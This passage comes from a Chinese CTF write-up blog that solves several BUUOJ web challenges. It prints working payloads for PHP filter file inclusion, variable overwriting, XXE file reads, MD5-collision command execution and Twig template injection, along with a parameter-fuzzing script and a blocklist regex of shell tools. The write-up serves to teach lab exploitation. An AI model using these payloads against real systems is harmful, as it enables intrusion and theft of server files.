day</h2><p>使用<code>/index.php?category=woofers1</code>测试后发现报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(woofers1.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening &#x27;woofers1.php&#x27; for inclusion (include_path=&#x27;.:/usr/local/lib/php&#x27;) in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure><p>使用<code>/index.php?category=php://filter/read/convert.base64-encode/resource=index</code>获得<code>index.php</code>的源码，其中<code>php</code>部分如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读取<code>flag.php</code>内容即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#方法一</span><br><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br><span class="line">#方法二</span><br><span class="line">/index.php?category=php://filter/read/convert.base64-encode/resource=woofers/../flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// flag&#123;bb6c568d-c1cd-4aef-b7bd-ab7c2233db07&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>使用<code>dirsearch</code>发现有<code>git</code>源码泄露</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python dirsearch.py -u http://2bdf7730-1332-4b14-b414-5dc7200276d0.node4.buuoj.cn:81/ -t 1 --timeout=2 -x 400,403,404,500,503,429</span><br></pre></td></tr></table></figure><p>使用<code>GitHack</code>下载源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.jianshu.com/p/a4d782e91852">CTF之php变量覆盖漏洞</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># payload-1</span><br><span class="line">/?handsome=flag&amp;flag=handsome</span><br><span class="line"># payload-2</span><br><span class="line">/?yds=flag</span><br></pre></td></tr></table></figure><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>抓包发现应为<code>XXE</code>，构造流量包如下即可</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>4ea7c0d3-a5c1-4b83-8691-c7096d35acbd.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/xml, text/xml, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml;charset=utf-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>145</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://4ea7c0d3-a5c1-4b83-8691-c7096d35acbd.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://4ea7c0d3-a5c1-4b83-8691-c7096d35acbd.node4.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">   <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span> ]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><p>打开发现<code>URL</code>中存在<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>，使用如下脚本得到<code>555.png</code>，以及<code>index.php</code>对应字符</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$img</span> = <span class="string">&#x27;TXpVek5UTTFNbVUzTURabE5qYz0&#x27;</span>;</span><br><span class="line"><span class="comment">// echo base64_decode(base64_decode($img));</span></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$img</span>))); <span class="comment">//555.png</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$ss</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$ss</span>)));<span class="comment">//TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>故构造<code>/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code>并解码得到<code>index.php</code>源码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) </span><br><span class="line">    header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=sort%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>7157185a-232d-4603-931a-9f61c0d87bea.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://7157185a-232d-4603-931a-9f61c0d87bea.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\t%20/flag</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>389</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://7157185a-232d-4603-931a-9f61c0d87bea.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span></span><br></pre></td></tr></table></figure><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>根据提示获得源码，直接网上嫖脚本一个个试即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">base_dir = <span class="string">&#x27;D:\\phpStudy\\phpstudy_pro\\WWW\\src&#x27;</span></span><br><span class="line">file=os.listdir(base_dir)</span><br><span class="line">zz=re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=_GET\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)     <span class="comment">#正则匹配</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file[<span class="number">2663</span>:<span class="number">2665</span>]:</span><br><span class="line">      url=<span class="string">&quot;http://localhost/src/&quot;</span>+i</span><br><span class="line">      f=<span class="built_in">open</span>(base_dir+<span class="string">&quot;\\&quot;</span>+i)   <span class="comment">#注意路径，用\\</span></span><br><span class="line">      data=f.read()</span><br><span class="line">      f.close()</span><br><span class="line">      res=zz.findall(data)</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> res:</span><br><span class="line">           payload=url+<span class="string">&quot;?&quot;</span>+j+<span class="string">&quot;=echo 123456&quot;</span></span><br><span class="line">           ret=requests.get(payload)</span><br><span class="line">           <span class="comment"># print(payload)</span></span><br><span class="line">           <span class="keyword">if</span> <span class="string">&quot;123456&quot;</span> <span class="keyword">in</span> ret.text:</span><br><span class="line">              <span class="built_in">print</span>(payload)</span><br><span class="line">              exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>最终<code>payload</code>为<code>xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</code></p><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><p>F12发现<code>hint:&lt;!-- Why not take a closer look at cookies? --&gt;</code></p><p>访问<code>flag.php</code>抓包后发现，在<code>POST</code>后的<code>GET</code>请求的流量的<code>cookie</code>中的<code>user</code>字段存在模板注入漏洞，最终<code>payload</code></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>cd078bc1-3c20-4098-90ab-d2ab8f06ffa1.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://cd078bc1-3c20-4098-90ab-d2ab8f06ffa1.node4.buuoj.cn:81/flag.php</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=60366b7e3fd3e008617661364746fa76; user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p>发现存在<code>robots.txt</code>，进入后看到<code>fAke_f1agggg.php</code>，访问后在响应头发现<code>Look_at_me:/fl4g.php</code>，访问后获得题目源码，使用火狐浏览器修复下即可（<code>ALT</code>—&gt;查看—&gt;修复编码）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://www.wangt.cc/2021/10/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/">PHP特性总结</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=more&lt;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure><h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><p>点击获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span 